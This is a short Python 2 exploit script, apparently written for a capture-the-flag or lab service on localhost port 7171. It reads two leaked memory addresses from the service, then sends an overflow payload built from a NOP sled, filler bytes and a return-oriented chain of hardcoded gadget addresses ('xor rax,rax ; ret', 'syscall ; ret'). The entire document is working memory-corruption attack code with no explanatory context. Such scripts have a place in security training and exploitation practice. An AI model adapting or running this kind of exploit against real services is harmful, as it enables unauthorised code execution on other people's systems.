from socket import create_connection
import struct

XOR_RAX_RAX = 0x000000000043241f # xor rax,rax ; ret
SYSCALL     = 0x000000000040168a # syscall
SYSCALL_RET = 0x0000000000446e85 # syscall ; ret

def recv_n_bytes(sock, n):
    c = 0
    data = ''
    while c < n:
        data += sock.recv(1)
        c += 1
    return data

s = create_connection(("localhost", 7171))
buffer_address = recv_n_bytes(s, 8)
print repr(buffer_address)
buffer_address = struct.unpack("<Q", buffer_address)[0]
print hex(buffer_address)

page = recv_n_bytes(s, 8)
print repr(page)
page = struct.unpack("<Q", page)[0]
print hex(page)

sploit  = "\x90" * 0x200
sploit += "B" * 8
sploit += struct.pack("<Q", XOR_RAX_RAX)
sploit += struct.pack("<Q", SYSCALL_RET)
s.send(sploit)
